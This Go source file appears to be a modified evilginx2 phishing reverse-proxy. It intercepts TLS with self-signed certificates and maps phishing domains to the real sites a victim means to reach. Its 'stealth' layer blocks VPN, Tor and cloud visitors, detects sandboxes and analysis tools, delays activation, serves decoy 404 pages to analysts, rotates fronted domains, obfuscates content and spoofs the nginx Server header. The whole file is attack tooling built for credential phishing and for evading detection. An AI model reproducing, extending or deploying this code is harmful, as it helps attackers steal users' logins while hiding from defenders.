package proxy

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/elazarl/goproxy"
	"github.com/kgretzky/evilginx2/core"
	"github.com/kgretzky/evilginx2/internal/stealth"
	"github.com/kgretzky/evilginx2/log"
	"github.com/kgretzky/evilginx2/proto"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
)

const (
	httpReadTimeout  = 10 * time.Second
	httpWriteTimeout = 10 * time.Second
)

type ProxyService struct {
	server          *http.Server
	proxy           *goproxy.ProxyHttpServer
	crtDB           *core.CertDb
	controlAddr     string
	controlConn     *grpc.ClientConn
	controlClient   proto.ProxyControlServiceClient
	sniListener     net.Listener
	isRunning       bool
	port            string
	certPath        string
	trafficFilter   *stealth.TrafficFilter
	domainFronting  *stealth.DomainFronting
	obfuscator      *stealth.Obfuscator
	evasionEngine   *stealth.EvasionEngine
	mu              sync.RWMutex
}

func NewProxyService(port, controlAddr, certPath string) *ProxyService {
	proxy := goproxy.NewProxyHttpServer()
	proxy.Verbose = false

	filterConfig := &stealth.FilterConfig{
		EnableBotFiltering:   true,
		AllowedCountries:     []string{"US", "CA", "GB", "AU", "DE", "FR"},
		BlockVPN:             true,
		BlockTor:             true,
		BlockCloudProviders:  true,
		MaxRequestsPerMinute: 60,
	}

	frontingConfig := &stealth.FrontingConfig{
		EnableFronting:     true,
		RotationInterval:   time.Hour * 24,
		MaxFrontDomains:    10,
		PreferredProviders: []string{"cloudflare", "aws"},
	}

	obfuscationConfig := &stealth.ObfuscationConfig{
		EnableURLObfuscation:       true,
		EnableContentObfuscation:   true,
		EnableTrafficRandomization: true,
		RandomizeJSVariables:       true,
		RandomizeCSSClasses:        true,
		InjectHTMLComments:         true,
		RandomizeResourcePaths:     true,
		DecoyParameters:            []string{"_t", "_r", "_v", "_s"},
		DecoyHeaders:               []string{"X-Request-ID", "X-Trace-ID"},
	}

	evasionConfig := &stealth.EvasionConfig{
		EnableSandboxDetection:    true,
		EnableAntiAnalysis:        true,
		EnableTimeBasedActivation: true,
		ActivationDelay:           time.Minute * 5,
		RequiredInteractions:      3,
		BlockAnalysisTools:        true,
		ObfuscateResponses:        true,
	}

	return &ProxyService{
		proxy:          proxy,
		controlAddr:    controlAddr,
		port:           port,
		certPath:       certPath,
		isRunning:      false,
		trafficFilter:  stealth.NewTrafficFilter(filterConfig),
		domainFronting: stealth.NewDomainFronting(frontingConfig),
		obfuscator:     stealth.NewObfuscator(obfuscationConfig),
		evasionEngine:  stealth.NewEvasionEngine(evasionConfig),
	}
}

func (p *ProxyService) Start(ctx context.Context) error {
	if err := p.initControlConnection(); err != nil {
		return fmt.Errorf("failed to connect to control service: %w", err)
	}
	defer p.controlConn.Close()

	if err := p.initCertDB(); err != nil {
		return fmt.Errorf("failed to initialize certificate database: %w", err)
	}

	p.setupProxyHandlers()

	p.server = &http.Server{
		Addr:         ":" + p.port,
		Handler:      p.proxy,
		ReadTimeout:  httpReadTimeout,
		WriteTimeout: httpWriteTimeout,
	}

	log.Info("Starting proxy service on port %s", p.port)
	log.Info("Connected to control service at %s", p.controlAddr)

	go p.httpsWorker()

	select {
	case <-ctx.Done():
		log.Info("Shutting down proxy service...")
		p.isRunning = false
		if p.sniListener != nil {
			p.sniListener.Close()
		}
		return p.server.Shutdown(context.Background())
	}
}

func (p *ProxyService) initControlConnection() error {
	conn, err := grpc.Dial(p.controlAddr, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		return err
	}

	p.controlConn = conn
	p.controlClient = proto.NewProxyControlServiceClient(conn)

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	_, err = p.controlClient.ValidateSession(ctx, &proto.ValidateSessionRequest{
		Hostname: "test",
	})
	if err != nil {
		return fmt.Errorf("failed to validate control service connection: %w", err)
	}

	return nil
}

func (p *ProxyService) initCertDB() error {
	if p.certPath == "" {
		return fmt.Errorf("certificate path cannot be empty")
	}
	
	var err error
	p.crtDB, err = core.NewCertDb(p.certPath, nil, nil)
	if err != nil {
		return fmt.Errorf("failed to initialize certificate database: %w", err)
	}
	return nil
}

func (p *ProxyService) setupProxyHandlers() {
	p.proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)
	p.proxy.OnRequest().DoFunc(p.handleRequest)
	p.proxy.OnResponse().DoFunc(p.handleResponse)
}

func (p *ProxyService) handleRequest(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
	filterResult, err := p.trafficFilter.ShouldBlock(req)
	if err == nil && filterResult.ShouldBlock {
		log.Info("Blocking request: %s", filterResult.Reason)
		return req, goproxy.NewResponse(req, "text/html", http.StatusForbidden, "Access denied")
	}

	evasionResult, err := p.evasionEngine.EvaluateRequest(req)
	if err == nil && evasionResult.ShouldBlock {
		log.Info("Blocking request due to evasion: %s", evasionResult.Reason)
		decoyResponse := p.evasionEngine.GenerateDecoyResponse()
		return req, goproxy.NewResponse(req, "text/html", http.StatusNotFound, decoyResponse)
	}

	hostname := req.Host
	if strings.Contains(hostname, ":") {
		hostname = strings.Split(hostname, ":")[0]
	}

	shouldHandle, err := p.controlClient.ValidateSession(context.Background(), &proto.ValidateSessionRequest{
		Hostname: hostname,
	})
	if err != nil {
		log.Error("Failed to validate session: %v", err)
		return req, p.blockRequest()
	}

	if !shouldHandle.ShouldHandle {
		return req, p.blockRequest()
	}

	originalURL := req.URL.String()
	obfuscatedURL, err := p.obfuscator.RandomizeURL(originalURL)
	if err == nil {
		newURL, parseErr := url.Parse(obfuscatedURL)
		if parseErr == nil {
			req.URL = newURL
		}
	}

	originalHost, replaced := p.replaceHostWithOriginal(hostname)
	if replaced {
		req.Host = originalHost
		req.URL.Host = originalHost
	}

	return req, nil
}

func (p *ProxyService) handleResponse(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
	if resp == nil {
		return resp
	}

	hostname := ctx.Req.Host
	if strings.Contains(hostname, ":") {
		hostname = strings.Split(hostname, ":")[0]
	}

	phishletResp, err := p.controlClient.GetPhishletByHost(context.Background(), &proto.GetPhishletRequest{
		Hostname:     hostname,
		IsPhishHost:  false,
	})
	if err != nil || !phishletResp.Found {
		return resp
	}

	contentType := resp.Header.Get("Content-Type")
	if strings.Contains(contentType, "text/html") || 
	   strings.Contains(contentType, "application/javascript") || 
	   strings.Contains(contentType, "text/css") {
		
		if resp.Body != nil {
			body, readErr := io.ReadAll(resp.Body)
			if readErr == nil {
				resp.Body.Close()

				obfuscatedContent := p.obfuscator.ObfuscateContent(string(body), contentType)
				obfuscatedContent = p.evasionEngine.ObfuscateResponse(obfuscatedContent)

				resp.Body = io.NopCloser(strings.NewReader(obfuscatedContent))
				resp.ContentLength = int64(len(obfuscatedContent))
				resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(obfuscatedContent)))
			}
		}
	}

	decoyHeaders := p.obfuscator.GenerateDecoyHeaders()
	for key, value := range decoyHeaders {
		resp.Header.Set(key, value)
	}

	resp.Header.Set("Server", "nginx/1.18.0")

	return resp
}

func (p *ProxyService) replaceHostWithOriginal(hostname string) (string, bool) {
	if hostname == "" {
		return hostname, false
	}

	prefix := ""
	if hostname[0] == '.' {
		prefix = "."
		hostname = hostname[1:]
	}

	phishletResp, err := p.controlClient.GetPhishletByHost(context.Background(), &proto.GetPhishletRequest{
		Hostname:    hostname,
		IsPhishHost: true,
	})
	if err != nil || !phishletResp.Found {
		return hostname, false
	}

	for _, ph := range phishletResp.Phishlet.ProxyHosts {
		if hostname == p.combineHost(ph.PhishSubdomain, phishletResp.PhishDomain) {
			return prefix + p.combineHost(ph.OrigSubdomain, ph.Domain), true
		}
	}

	return hostname, false
}

func (p *ProxyService) replaceHostWithPhished(hostname string) (string, bool) {
	if hostname == "" {
		return hostname, false
	}

	prefix := ""
	if hostname[0] == '.' {
		prefix = "."
		hostname = hostname[1:]
	}

	phishletResp, err := p.controlClient.GetPhishletByHost(context.Background(), &proto.GetPhishletRequest{
		Hostname:    hostname,
		IsPhishHost: false,
	})
	if err != nil || !phishletResp.Found {
		return hostname, false
	}

	for _, ph := range phishletResp.Phishlet.ProxyHosts {
		if hostname == p.combineHost(ph.OrigSubdomain, ph.Domain) {
			return prefix + p.combineHost(ph.PhishSubdomain, phishletResp.PhishDomain), true
		}
		if hostname == ph.Domain {
			return prefix + phishletResp.PhishDomain, true
		}
	}

	return hostname, false
}

func (p *ProxyService) blockRequest() *http.Response {
	return goproxy.NewResponse(nil, "text/html", http.StatusNotFound, "404 Not Found")
}

func (p *ProxyService) combineHost(subdomain, domain string) string {
	if subdomain == "" {
		return domain
	}
	return subdomain + "." + domain
}

func (p *ProxyService) patchResponse(resp *http.Response, phishlet *proto.Phishlet) (*http.Response, error) {
	return resp, nil
}

func (p *ProxyService) httpsWorker() {
	var err error

	p.sniListener, err = net.Listen("tcp", ":"+p.port)
	if err != nil {
		log.Fatal("Failed to start HTTPS listener: %s", err)
		return
	}

	p.isRunning = true
	for p.isRunning {
		c, err := p.sniListener.Accept()
		if err != nil {
			if p.isRunning {
				log.Error("Error accepting connection: %s", err)
			}
			continue
		}

		go func(c net.Conn) {
			defer c.Close()

			now := time.Now()
			c.SetReadDeadline(now.Add(httpReadTimeout))
			c.SetWriteDeadline(now.Add(httpWriteTimeout))

			tlsConn := tls.Server(c, &tls.Config{
				GetCertificate: p.getCertificate,
			})

			if err := tlsConn.Handshake(); err != nil {
				return
			}

			hostname := tlsConn.ConnectionState().ServerName
			if hostname == "" {
				return
			}

			shouldHandle, err := p.controlClient.ValidateSession(context.Background(), &proto.ValidateSessionRequest{
				Hostname: hostname,
			})
			if err != nil || !shouldHandle.ShouldHandle {
				return
			}

			originalHost, _ := p.replaceHostWithOriginal(hostname)

			req := &http.Request{
				Method: "CONNECT",
				Host:   originalHost,
				Header: make(http.Header),
			}

			p.proxy.ServeHTTP(&dumbResponseWriter{tlsConn}, req)
		}(c)
	}
}

func (p *ProxyService) getCertificate(hello *tls.ClientHelloInfo) (*tls.Certificate, error) {
	if p.crtDB == nil {
		return nil, fmt.Errorf("certificate database not initialized")
	}
	
	hostname := hello.ServerName
	if hostname == "" {
		return nil, fmt.Errorf("no server name provided")
	}
	
	cert, err := p.crtDB.GetSelfSignedCertificate(hostname, "", 443)
	if err != nil {
		log.Warning("Failed to get certificate for %s: %v", hostname, err)
		return nil, err
	}
	
	return cert, nil
}

type dumbResponseWriter struct {
	net.Conn
}

func (dumb dumbResponseWriter) Header() http.Header {
	panic("Header() should not be called on this ResponseWriter")
}

func (dumb dumbResponseWriter) Write(buf []byte) (int, error) {
	return dumb.Conn.Write(buf)
}

func (dumb dumbResponseWriter) WriteHeader(code int) {
	panic("WriteHeader() should not be called on this ResponseWriter")
}
